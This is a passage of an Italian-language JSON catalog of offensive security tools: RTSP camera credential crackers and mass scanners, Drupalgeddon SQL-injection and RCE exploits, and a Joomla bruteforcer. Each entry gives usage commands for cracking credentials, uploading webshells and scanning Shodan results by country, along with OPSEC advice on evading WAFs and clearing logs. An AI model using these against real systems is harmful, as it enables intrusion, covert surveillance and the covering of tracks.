    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rtsp_crack</strong> e uno script di verifica rapida progettato con la filosofia \"Check and Go\". A differenza dei bruteforcer esaustivi che testano migliaia di combinazioni, questo strumento utilizza un database interno ridotto contenente le credenziali di fabbrica piu comuni per i principali produttori di telecamere IP (Axis, Panasonic, Samsung, Dahua, Hikvision, Vivotek, Bosch e altri). E ottimizzato per la velocita: verifica se un dispositivo e stato lasciato con le impostazioni di default in pochi secondi anziche in minuti o ore. Questo approccio lo rende ideale per scansioni rapide su larga scala dove l'obiettivo e identificare i dispositivi piu vulnerabili (quelli mai configurati) piuttosto che forzare password personalizzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Default Credential Database:</strong> Lo strumento include una lista curata delle \"Top 20-50\" combinazioni di credenziali IoT piu diffuse, basata su statistiche reali di deployment. Queste includono le password di fabbrica documentate nei manuali dei produttori (admin/admin, admin/12345, admin/password, root/pass) nonche credenziali comuni configurate dagli installatori (admin/1234, admin/123456, service/service). Il database e aggiornabile manualmente aggiungendo nuove entry al file di configurazione.</p><p><strong>Stream Validation Completa:</strong> A differenza di altri tool che si limitano a verificare se le credenziali sono accettate dal server (risposta 200 OK), rtsp_crack esegue una negoziazione RTSP completa attraverso le fasi DESCRIBE, SETUP e PLAY. Questo conferma che il flusso video e effettivamente accessibile e riproducibile, non solo che l'interfaccia di gestione accetta le credenziali. Questa distinzione e importante perche alcuni dispositivi hanno credenziali separate per l'accesso web e per lo streaming RTSP.</p><p><strong>Modalita Batch:</strong> Lo strumento accetta in input un file contenente una lista di target (IP:porta) e li testa sequenzialmente, generando un report sintetico con lo stato di ogni dispositivo (vulnerabile, protetto, irraggiungibile). Questa modalita e ideale per audit di conformita su centinaia di telecamere.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo strumento si utilizza come script Python o Bash, specificando il target da verificare. La sintassi e volutamente minimale per facilitare l'integrazione in pipeline automatizzate.</p><pre><code># Check rapido su singolo target\npython3 rtsp_crack.py 192.168.1.50\n\n# Check con porta personalizzata\npython3 rtsp_crack.py 192.168.1.50:8554\n\n# Check batch da lista di target\npython3 rtsp_crack.py -f targets.txt -o report.csv\n\n# Check con wordlist custom aggiuntiva\npython3 rtsp_crack.py 192.168.1.50 -w extra_creds.txt</code></pre><p>L'output per ogni target include: stato (vulnerabile/protetto/offline), credenziali trovate (se vulnerabile), percorso dello stream verificato e tempo di risposta del dispositivo. Il formato CSV facilita l'importazione nei tool di reporting.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>Vulnerability Assessment</strong> o un audit di conformita, rtsp_crack permette di verificare rapidamente se le policy aziendali di cambio password al primo avvio sono state effettivamente rispettate dagli installatori dei sistemi di videosorveglianza. In molte organizzazioni, le telecamere vengono installate da ditte esterne che lasciano le credenziali di default per comodita, creando un rischio significativo. Lo strumento e anche utile come primo passaggio di triage prima di utilizzare tool piu aggressivi: se un dispositivo ha ancora le credenziali di fabbrica, non e necessario un bruteforce completo. In contesti di <strong>Red Team</strong>, permette di identificare rapidamente i \"low-hanging fruit\" nella rete di videosorveglianza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Data la natura del tool (pochi tentativi mirati), rtsp_crack e significativamente piu silenzioso di un bruteforcer completo. Genera al massimo 20-50 tentativi di autenticazione per dispositivo, un volume che difficilmente attiva alert automatici sui sistemi di monitoraggio. Tuttavia, i tentativi falliti vengono comunque registrati nei log del dispositivo.</p><p><strong>Impatto operativo:</strong> L'impatto sui dispositivi e minimo grazie al basso numero di tentativi. Non causa sovraccarico, riavvii o interruzioni del servizio di streaming. Questo lo rende adatto per test durante l'orario di produzione senza necessita di finestre di manutenzione dedicate.</p><p><strong>Mitigazioni:</strong> Anche se il tool e poco invasivo, e buona pratica informare il team di sicurezza fisica prima di eseguire i test. Documentare accuratamente tutti i dispositivi trovati con credenziali di default e classificarli per criticita in base alla posizione della telecamera e alla sensibilita dell'area sorvegliata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-digest-auth-bruteforcer",
    "name": "RTSP-Digest-Auth-Bruteforcer",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script specializzato per attaccare l'autenticazione Digest (più sicura della Basic) su stream RTSP tramite dizionario.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RTSP-Digest-Auth-Bruteforcer</strong> e uno strumento specializzato progettato per colmare una lacuna specifica nell'arsenale di testing RTSP: la maggior parte dei bruteforcer disponibili supporta unicamente l'autenticazione Basic (credenziali trasmesse in Base64, facilmente decodificabili). Questo tool e invece progettato per gestire il meccanismo di autenticazione Digest, un protocollo challenge-response basato su hash MD5 che offre un livello di sicurezza superiore. Lo strumento calcola correttamente gli hash necessari per ogni tentativo di password, automatizzando il processo matematico del protocollo HTTP Digest Authentication (RFC 2617) applicato al contesto RTSP. E essenziale contro telecamere IP moderne o configurate con livelli di sicurezza elevati dove gli strumenti generici falliscono silenziosamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Digest Challenge Handling:</strong> Quando un server RTSP richiede l'autenticazione Digest, invia un nonce (numero casuale monouso) insieme al realm del servizio. Lo strumento intercetta questo challenge e, per ogni password nella wordlist, genera automaticamente la risposta hash valida calcolando: <code>MD5(MD5(username:realm:password):nonce:MD5(method:uri))</code>. Questo processo e completamente trasparente all'utente e viene eseguito per ogni singolo tentativo, poiche il nonce cambia ad ogni richiesta.</p><p><strong>Targeting Mirato e Persistente:</strong> Lo strumento e ottimizzato per attacchi focalizzati su un singolo flusso video specifico, piuttosto che per scansioni di massa. Mantiene la sessione aperta il piu a lungo possibile per ridurre l'overhead di connessione, ed e in grado di gestire il rinnovo del nonce da parte del server senza perdere lo stato dell'attacco. Questo lo rende ideale per \"aprire\" una telecamera specifica individuata durante la fase di ricognizione.</p><p><strong>Supporto Dual-Mode:</strong> Lo strumento rileva automaticamente se il server richiede autenticazione Basic o Digest e si adatta di conseguenza. Se il server supporta entrambi i metodi (tramite header WWW-Authenticate multipli), testa prima il Digest (piu comune su dispositivi moderni) e poi il Basic come fallback, massimizzando la compatibilita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo strumento richiede Python 3 e la libreria <code>requests</code>. Si utilizza specificando l'URL RTSP completo del target, l'username da testare e il file di password.</p><pre><code># Attacco Digest su target specifico con user admin\npython3 rtsp-digest-brute.py -u rtsp://192.168.1.50:554/live -U admin -W passwords.txt\n\n# Attacco con lista di username multipli\npython3 rtsp-digest-brute.py -u rtsp://192.168.1.50:554/Streaming/Channels/101 -U users.txt -W passwords.txt\n\n# Attacco con timeout e delay personalizzati\npython3 rtsp-digest-brute.py -u rtsp://10.0.0.100:554/cam/realmonitor -U admin -W rockyou_rtsp.txt --timeout 3 --delay 0.5\n\n# Attacco con output verboso per debug\npython3 rtsp-digest-brute.py -u rtsp://192.168.1.50:554/live -U admin -W passwords.txt -v</code></pre><p>L'output mostra in tempo reale i tentativi effettuati, il nonce corrente e, in caso di successo, le credenziali valide trovate. La modalita verbose (<code>-v</code>) visualizza anche gli header HTTP completi per il debugging di problemi di connettivita.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>High-Security IoT Audit</strong>, quando Nmap rileva la porta 554 aperta e identifica un servizio RTSP che richiede autenticazione Digest, strumenti come Hydra o Medusa possono fallire silenziosamente perche non implementano correttamente il protocollo Digest nel contesto RTSP. Questo tool colma questa lacuna permettendo di testare la robustezza delle password anche su dispositivi configurati con il livello di sicurezza piu elevato. E anche utilizzato in contesti di <strong>Compliance Verification</strong> per dimostrare che l'upgrade da Basic a Digest auth non e sufficiente come unica misura di protezione se le password rimangono deboli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'autenticazione Digest richiede un handshake a 4 passaggi per ogni tentativo di password (richiesta iniziale, ricezione challenge, invio risposta hash, verifica), generando un volume di traffico di rete significativamente superiore rispetto all'autenticazione Basic. Questo rende l'attacco piu lento e contemporaneamente piu facilmente rilevabile da sistemi di monitoraggio del traffico di rete.</p><p><strong>Impatto operativo:</strong> L'overhead computazionale del calcolo degli hash MD5 per ogni tentativo e trascurabile lato attaccante, ma il dispositivo target deve verificare ogni hash ricevuto, consumando risorse CPU limitate. Su telecamere con processori embedded poco potenti, un attacco sostenuto puo degradare la qualita del flusso video o causare frame drop visibili agli operatori di sicurezza.</p><p><strong>Mitigazioni:</strong> Utilizzare delay tra i tentativi per ridurre l'impatto sul dispositivo e la visibilita nel traffico di rete. Limitare le wordlist ai dizionari specifici per il vendor identificato. Monitorare lo stato del dispositivo durante l'attacco e interrompere immediatamente se si osservano degradi nel servizio di streaming.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-findingsomefun",
    "name": "RTSP-FindingSomeFun",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ThatNotEasy/RTSP-FindingSomeFun",
    "desc": "Scanner RTSP massivo multi-thread per discovery di porte 554 e bruteforce simultaneo di path e credenziali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RTSP-FindingSomeFun</strong> e uno strumento aggressivo di discovery e exploitation progettato per scansionare ampi range di indirizzi IP alla ricerca di telecamere RTSP esposte. A differenza di tool piu mirati che operano su singoli target, questo strumento e pensato per operazioni su larga scala: puo processare intere subnet /16 o addirittura elenchi di milioni di indirizzi IP. Combina un port scanner veloce multi-thread con un motore di bruteforce integrato per identificare telecamere esposte, determinare il percorso dello stream video e tentare l'accesso con credenziali di default, il tutto in un unico passaggio automatizzato. La sua caratteristica distintiva e la velocita bruta ottenuta tramite multithreading aggressivo.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Mass Scanning Multi-Thread:</strong> Lo strumento accetta in input liste di indirizzi IP, range CIDR o file di target e li scansiona parallelamente utilizzando centinaia di thread simultanei. Il port scanner integrato verifica rapidamente la disponibilita della porta 554 (e opzionalmente 8554, 5554, 10554) su ogni host, ignorando immediatamente quelli chiusi o filtrati per concentrare le risorse sugli host attivi. La velocita di scansione puo raggiungere migliaia di host al minuto su connessioni a banda larga.</p><p><strong>Smart Brute Combinato:</strong> Per ogni host con porta RTSP aperta, lo strumento esegue simultaneamente il bruteforce del percorso dello stream (utilizzando un database di path specifici per vendor come Hikvision, Dahua, Axis) e delle credenziali (testando le combinazioni di default piu comuni: admin/admin, admin/12345, admin/password). Questa strategia combinata massimizza le probabilita di successo su dispositivi non configurati correttamente, che rappresentano la maggioranza delle telecamere IoT esposte.</p><p><strong>Output Organizzato e Filtrato:</strong> I risultati vengono salvati in file strutturati che separano gli host trovati per categoria: telecamere accessibili senza autenticazione, telecamere con credenziali di default, telecamere protette ma raggiungibili. Per ogni telecamera accessibile, viene registrato l'URL RTSP completo (incluso percorso e credenziali) pronto per essere aperto con VLC o altri player multimediali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo strumento si clona da GitHub e si esegue con Python 3. Richiede la libreria <code>opencv-python</code> per la cattura opzionale di thumbnail e <code>shodan</code> per l'integrazione con il motore di ricerca IoT.</p><pre><code># Scansione da lista di indirizzi IP con 500 thread\npython3 rtsp.py -i ip_list.txt -t 500\n\n# Scansione di un range CIDR con output personalizzato\npython3 rtsp.py -r 192.168.0.0/16 --output found_cameras.txt\n\n# Scansione con cattura thumbnail per ogni telecamera trovata\npython3 rtsp.py -i targets.txt -t 200 --screenshot\n\n# Integrazione con Shodan per ottenere target\npython3 rtsp.py --shodan \"port:554 country:IT\" -t 300</code></pre><p>Il parametro <code>-t</code> controlla il numero di thread paralleli. Valori elevati (500+) accelerano la scansione ma richiedono una connessione stabile e possono generare alert sui firewall di rete. Si consiglia di iniziare con valori moderati (50-100) e aumentare gradualmente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Negli scenari di <strong>Large Scale Reconnaissance</strong>, RTSP-FindingSomeFun e ideale per mappare la superficie d'attacco IoT di un'intera organizzazione distribuita su piu sedi. Permette di trovare rapidamente dispositivi dimenticati, telecamere installate da terzi senza autorizzazione (Shadow IT) o dispositivi collegati direttamente a internet senza protezione firewall. In contesti di <strong>Bug Bounty</strong> con scope ampio, lo strumento consente di identificare rapidamente telecamere esposte nell'infrastruttura del target. E anche utilizzato da ricercatori di sicurezza per studi sulla diffusione di telecamere non protette e per campagne di responsible disclosure verso i proprietari dei dispositivi vulnerabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo strumento e estremamente rumoroso. Il volume di traffico generato dalla scansione multi-thread viene immediatamente flaggato da firewall, IDS/IPS e sistemi di monitoraggio come attivita di scansione ostile. I log degli ISP registrano le connessioni verso migliaia di IP distinti in tempi brevissimi, un pattern inequivocabilmente associato a scansioni automatizzate.</p><p><strong>Impatto operativo:</strong> La scansione aggressiva puo causare il blocco dell'indirizzo IP sorgente da parte di firewall e provider di servizi internet. Su reti locali, il volume di traffico generato puo saturare la banda disponibile e degradare le prestazioni di rete per tutti gli utenti. I dispositivi IoT con risorse limitate possono riavviarsi o bloccarsi se ricevono troppe connessioni simultanee.</p><p><strong>Mitigazioni:</strong> Utilizzare lo strumento esclusivamente all'interno del perimetro autorizzato dal contratto di penetration testing. Ridurre il numero di thread per minimizzare l'impatto sulla rete. Coordinare le scansioni con il team di rete del cliente per evitare falsi allarmi e interruzioni di servizio. Non utilizzare mai lo strumento per scansionare range IP esterni al perimetro autorizzato, poiche tale attivita potrebbe configurare reati informatici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtspscanner",
    "name": "RTSPScanner",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/BeardedTek-com/RTSPScanner",
    "desc": "Utility Python per enumerare stream RTSP su intere subnet, verificare percorsi comuni e catturare screenshot di anteprima.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RTSPScanner</strong> è uno strumento progettato per la ricognizione di dispositivi IoT e telecamere di sicurezza che espongono il protocollo Real Time Streaming Protocol (RTSP). A differenza di un semplice port scanner, questo tool tenta attivamente di connettersi al servizio sulla porta 554 (o custom) e bruteforza i percorsi delle risorse (es. <code>/live</code>, <code>/h264</code>) per verificare l'accesso allo stream video, spesso non protetto da autenticazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mass Scanning:</strong> Accetta in input range CIDR o liste di IP e scansiona rapidamente la porta 554 in multithreading. È ottimizzato per gestire timeout brevi, permettendo di analizzare vaste reti IoT in tempi ridotti.</p><p><strong>Path Brute-forcing:</strong> Una volta rilevata una porta aperta, itera attraverso un dizionario interno di percorsi RTSP comuni (utilizzati da vendor come Hikvision, Dahua, Axis) per individuare l'URL esatto dello stream.</p><p><strong>Verifica Accesso:</strong> Tenta di stabilire una connessione allo stream. Se il server risponde positivamente (200 OK) senza richiedere credenziali, il tool lo segnala come vulnerabile e può tentare di salvare un frame immagine come prova (screenshot).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e le dipendenze installate. L'input può essere un singolo IP o una subnet.</p><pre><code># Scansione di una subnet locale\npython3 RTSPScanner.py -t 192.168.1.0/24\n\n# Scansione con output su file e screenshot attivi\npython3 RTSPScanner.py -t targets.txt --screenshot --output results.json</code></pre><p>I risultati vengono forniti in formato strutturato, indicando IP, porta, path valido ed eventuale screenshot catturato nella cartella di output.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>Physical Security Assessment</strong>, permette di dimostrare come un attaccante possa spiare i feed video aziendali senza autenticazione.</p><p>Durante un <strong>Internal Pentest</strong>, le telecamere sono spesso VLAN-hop points o dispositivi embedded con firmware non patchati che possono essere usati come pivot.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le connessioni RTSP fallite o i tentativi di indovinare il path generano log sugli NVR e sulle telecamere. Il traffico di rete è facilmente identificabile.</p><p><strong>Impatto operativo:</strong> Tentativi eccessivi su dispositivi low-power (vecchie IP camera) possono causare il freeze del servizio video o il riavvio del dispositivo.</p><p><strong>Mitigazioni:</strong> Limitare il numero di thread. Non eseguire screenshot massivi se la banda è limitata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "drupalgeddon",
    "name": "drupalgeddon",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script di exploit per CVE-2014-3704 (SQL Injection) su Drupal 7 che permette Admin Account Takeover e successiva RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Drupalgeddon</strong> (noto anche come Drupalgeddon v1) e lo script di exploit per la storica vulnerabilita CVE-2014-3704, una SQL Injection pre-autenticazione in Drupal 7 che ha avuto un impatto devastante su milioni di siti web. A differenza del suo successore Drupalgeddon2 che offre esecuzione remota di codice diretta, questo exploit sfrutta una manipolazione degli array nei parametri POST dell'API di astrazione del database di Drupal per iniettare query SQL arbitrarie. L'obiettivo primario e la creazione di un nuovo account amministratore o la sovrascrittura delle sessioni esistenti, garantendo il controllo totale del CMS e, successivamente, del server sottostante tramite l'abilitazione dell'esecuzione di codice PHP.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Admin Account Creation:</strong> L'exploit inietta comandi SQL direttamente nel database Drupal per inserire un nuovo utente con privilegi di ruolo 'administrator' nella tabella <code>users</code> e nella tabella di associazione <code>users_roles</code>. Le credenziali del nuovo account sono specificate dall'attaccante, garantendo accesso immediato al pannello di amministrazione del CMS. L'intera operazione viene completata con una singola richiesta HTTP POST appositamente costruita.</p><p><strong>Session Hijacking via SQL:</strong> In alternativa alla creazione di un nuovo utente (che lascia tracce evidenti), lo script puo modificare direttamente la tabella <code>sessions</code> del database per iniettare un cookie di sessione valido associato all'account amministratore esistente. Questo approccio e piu discreto poiche non crea nuovi record nella tabella utenti, ma richiede la conoscenza dell'ID dell'utente amministratore (tipicamente uid=1 in Drupal).</p><p><strong>PHP Filter Module Activation:</strong> Una volta ottenuto l'accesso amministrativo, lo script puo automatizzare l'abilitazione del modulo 'PHP Filter' di Drupal, che permette di inserire ed eseguire codice PHP arbitrario all'interno dei nodi del CMS. Questo passaggio trasforma l'accesso amministrativo in una Remote Code Execution completa sul sistema operativo del server, permettendo l'upload di webshell o l'esecuzione di comandi di sistema.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script e disponibile in diverse implementazioni (Ruby, Python, PHP). Si esegue specificando l'URL del sito Drupal 7 target e le credenziali desiderate per il nuovo account amministratore.</p><pre><code># Creazione di un nuovo account amministratore\n./drupalgeddon.rb -t https://target.com -u pwned -p pwned\n\n# Reset della password dell'admin esistente (uid=1)\n./drupalgeddon.rb -t https://target.com --reset-admin\n\n# Esecuzione con proxy per analisi del traffico\n./drupalgeddon.rb -t https://target.com -u test -p test --proxy http://127.0.0.1:8080\n\n# Versione Python alternativa\npython3 drupalgeddon.py -t https://target.com --create-admin testuser:testpass</code></pre><p>Dopo la creazione dell'account, lo script fornisce l'URL diretto al pannello di login (<code>/user/login</code>) e istruzioni per abilitare manualmente il modulo PHP Filter se l'automazione non e disponibile nella versione dello script utilizzata.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nei <strong>Legacy System Assessment</strong>, Drupalgeddon e fondamentale per testare vecchie installazioni Drupal 7 presenti nelle intranet aziendali o su server dimenticati che non sono stati patchati dopo l'ottobre 2014. Nonostante la vulnerabilita abbia oltre dieci anni, e ancora sorprendentemente diffusa in ambienti enterprise dove i sistemi legacy non vengono aggiornati per paura di rompere funzionalita personalizzate. Lo strumento e anche frequentemente presente in esercizi CTF (Capture The Flag) e piattaforme di formazione come HackTheBox e TryHackMe. In contesti di <strong>Red Team</strong>, un Drupal 7 non patchato sulla intranet rappresenta un punto di ingresso ideale per ottenere un foothold iniziale nella rete aziendale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'iniezione SQL genera pattern facilmente identificabili nei log del web server (Apache/Nginx) e del database MySQL/MariaDB. Le richieste POST contengono array PHP con strutture anomale che vengono flaggate da WAF (Web Application Firewall) come ModSecurity con le regole OWASP CRS. La creazione di un nuovo utente amministratore e un evento ad alta visibilita che genera log nel sistema di audit di Drupal (modulo dblog/syslog).</p><p><strong>Impatto operativo:</strong> L'exploit modifica direttamente il database del CMS, creando record permanenti. Se l'operazione viene interrotta a meta (ad esempio per un timeout di rete), potrebbe lasciare il database in uno stato inconsistente. Il reset della password dell'amministratore esistente e un'azione distruttiva che impedisce all'amministratore legittimo di accedere al sistema, generando inevitabilmente un'indagine.</p><p><strong>Mitigazioni:</strong> Preferire la creazione di un nuovo account con un nome poco appariscente piuttosto che il reset dell'admin esistente. Rimuovere l'account creato immediatamente dopo il test e documentare l'operazione nel report. Verificare la presenza di WAF prima di lanciare l'exploit per evitare di generare alert senza ottenere risultati. Coordinare il test con il team di sviluppo per poter ripristinare il database in caso di problemi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Drupal"
    ],
    "notes": null
  },
  {
    "id": "drupalgeddon2",
    "name": "drupalgeddon2",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dreadlocked/Drupalgeddon2",
    "desc": "Exploit script per CVE-2018-7600 (Drupalgeddon2), vulnerabilità critica RCE su Drupal 7/8 non autenticato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Drupalgeddon2</strong> e lo script di exploit per la CVE-2018-7600, una delle vulnerabilita piu gravi nella storia del CMS Drupal che ha colpito sia Drupal 7 che Drupal 8. La falla risiede in una mancata sanitizzazione dei parametri nelle Form API di Drupal, specificamente nel meccanismo di rendering degli elementi AJAX. Un attaccante remoto non autenticato puo iniettare ed eseguire comandi di sistema arbitrari inviando una singola richiesta HTTP POST appositamente costruita. L'exploit e altamente affidabile, funziona su installazioni default senza necessita di moduli aggiuntivi abilitati e non richiede alcuna credenziale, rendendolo uno degli exploit web piu pericolosi degli ultimi anni.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Unauthenticated Remote Code Execution:</strong> L'exploit sfrutta i parametri di rendering come <code>#post_render</code>, <code>#lazy_builder</code> o <code>#pre_render</code> nel sistema di Form API di Drupal per passare funzioni PHP arbitrarie come callback. Ad esempio, iniettando <code>passthru</code> come funzione di post-render con un comando di sistema come argomento, e possibile eseguire qualsiasi comando sul server con i privilegi dell'utente del web server (tipicamente www-data o apache). Non e richiesto alcun tipo di autenticazione o interazione utente.</p><p><strong>Auto-Detection e Version Fingerprinting:</strong> Prima di lanciare il payload effettivo, lo script esegue una serie di verifiche non distruttive per determinare se il target e vulnerabile. Identifica la versione di Drupal analizzando il file CHANGELOG.txt, il meta tag generator e gli header HTTP, verificando che rientri nel range delle versioni affette (Drupal 7.x prima della 7.58, Drupal 8.x prima della 8.3.9/8.4.6/8.5.1). Questo previene l'invio di payload inutili verso target non vulnerabili.</p><p><strong>Shell Interattiva e Payload Multipli:</strong> Lo script supporta diverse modalita operative: esecuzione di un singolo comando con output, upload di una webshell PHP per accesso persistente, o apertura di una reverse shell interattiva verso l'attaccante. La versione Ruby dello script include una pseudo-shell interattiva che permette di eseguire comandi sequenziali senza dover rilanciare l'exploit ad ogni iterazione, simulando una sessione terminale sul server remoto.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script e disponibile in implementazioni Ruby e Python. Si lancia specificando l'URL base del sito Drupal target. Lo script determina automaticamente la versione e il vettore di attacco appropriato.</p><pre><code># Exploit con shell interattiva (versione Ruby)\nruby drupalgeddon2.rb https://vulnerable-drupal.com\n\n# Esecuzione di un singolo comando (versione Python)\npython3 drupal7-cve-2018-7600.py -c \"id\" https://target.com\n\n# Esecuzione con upload di webshell\npython3 drupal-exploit.py https://target.com --upload-shell shell.php\n\n# Exploit tramite proxy per analisi traffico\nruby drupalgeddon2.rb https://target.com --proxy http://127.0.0.1:8080</code></pre><p>Una volta ottenuta la shell, e consigliabile verificare i privilegi correnti (<code>id</code>, <code>whoami</code>), la configurazione di rete (<code>ifconfig</code>) e il file <code>settings.php</code> di Drupal che contiene le credenziali del database, spesso riutilizzate per altri servizi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>External Penetration Test</strong>, trovare un'istanza Drupal non patchata equivale a ottenere accesso diretto al server web con un singolo comando. Questo rappresenta tipicamente il foothold iniziale da cui l'attaccante puo eseguire privilege escalation e lateral movement nella rete interna. Lo strumento e ampiamente utilizzato in piattaforme CTF (HackTheBox, TryHackMe, VulnHub) e in ambienti di formazione per la sicurezza offensiva. La vulnerabilita, nonostante sia stata patchata nel 2018, e ancora presente in un numero significativo di siti abbandonati, intranet aziendali e applicazioni legacy che non ricevono aggiornamenti regolari. In contesti di <strong>Red Team</strong>, un Drupal vulnerabile su un server DMZ puo fornire il pivot point necessario per raggiungere la rete interna.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload dell'exploit contengono pattern altamente specifici e facilmente firmabili da IDS/IPS e WAF. Le regole Snort e Suricata per CVE-2018-7600 sono ampiamente distribuite e attive nella maggior parte degli ambienti monitorati. Le richieste HTTP POST anomale verso endpoint come <code>/user/register</code> o <code>/user/password</code> con parametri contenenti callback PHP vengono immediatamente flaggate. I log del web server registrano l'intera richiesta malformata.</p><p><strong>Impatto operativo:</strong> L'esecuzione di comandi avviene con i privilegi del web server, tipicamente un utente non privilegiato (www-data). Tuttavia, comandi distruttivi o che consumano risorse eccessive possono causare il crash del servizio web o dell'intero server. L'upload di webshell crea file persistenti nel filesystem che possono essere rilevati da scanner antimalware o da controlli di integrita dei file.</p><p><strong>Mitigazioni:</strong> Verificare la presenza di WAF (ModSecurity, Cloudflare, AWS WAF) prima di tentare l'exploit, poiche le firme per questa CVE sono universalmente implementate. Utilizzare tecniche di offuscamento del payload se necessario bypassare le protezioni. Dopo l'ottenimento della shell, rimuovere eventuali webshell uploadate e ripulire i log accessibili. Documentare accuratamente tutte le azioni eseguite sul server per il report finale del penetration test.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Drupal"
    ],
    "notes": null
  },
  {
    "id": "joomla-bruteforce",
    "name": "joomla-bruteforce",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ajnik/joomla-bruteforce",
    "desc": "Script multi-thread per attacchi a dizionario contro pannelli di login Joomla, con supporto per evasione token CSRF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Joomla-bruteforce e un tool multi-thread progettato specificamente per attacchi a dizionario contro i pannelli di autenticazione di Joomla CMS. A differenza di strumenti generici come Hydra o Burp Intruder, questo script gestisce automaticamente il token anti-CSRF che Joomla include in ogni form di login, rigenerandolo ad ogni tentativo. Senza questa gestione, ogni richiesta di login verrebbe rifiutata dal server indipendentemente dalla correttezza delle credenziali. Il tool supporta wordlist personalizzate e puo operare con thread multipli per accelerare il processo di test, mantenendo la sessione valida attraverso la corretta gestione dei cookie di sessione PHP.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Gestione automatica token CSRF:</strong> Prima di ogni tentativo di login, lo script effettua una richiesta GET alla pagina di login, estrae il token CSRF dal form HTML e lo include nella richiesta POST successiva. Questo meccanismo e essenziale perche Joomla invalida il token dopo ogni utilizzo, rendendo impossibile il bruteforce con tool che non lo gestiscono.</p><p><strong>Multi-threading con session management:</strong> Utilizza thread multipli per parallelizzare i tentativi mantenendo sessioni separate per ogni thread. Ogni thread gestisce i propri cookie di sessione, evitando conflitti e garantendo che il server accetti ogni richiesta come proveniente da una sessione valida e indipendente.</p><p><strong>Detection bypass e fingerprinting:</strong> Include opzioni per randomizzare lo User-Agent, impostare delay tra le richieste e utilizzare proxy per distribuire il traffico. Puo inoltre rilevare automaticamente la versione di Joomla per adattare il formato della richiesta di login, che varia tra Joomla 3.x e 4.x.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script richiede Python 3 e la libreria requests. Si esegue specificando il target URL del pannello administrator di Joomla e le wordlist per username e password.</p><pre><code># Bruteforce con wordlist standard\npython3 joomla-bruteforce.py -u http://target.com/administrator -w passwords.txt -U admin\n\n# Attacco multi-utente con thread e proxy\npython3 joomla-bruteforce.py -u http://target.com/administrator -w rockyou.txt -U users.txt -t 10 --proxy socks5://127.0.0.1:9050\n\n# Con delay per evasione rate-limiting\npython3 joomla-bruteforce.py -u http://target.com/administrator -w passwords.txt -U admin --delay 2</code></pre><p>E fondamentale verificare che il target utilizzi effettivamente Joomla prima di lanciare il tool, ad esempio con CMSeek o analizzando manualmente i meta tag della pagina.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di web penetration testing dove il target utilizza Joomla CMS, questo tool rappresenta la scelta piu efficiente rispetto a configurare manualmente Burp Intruder con macro per la gestione 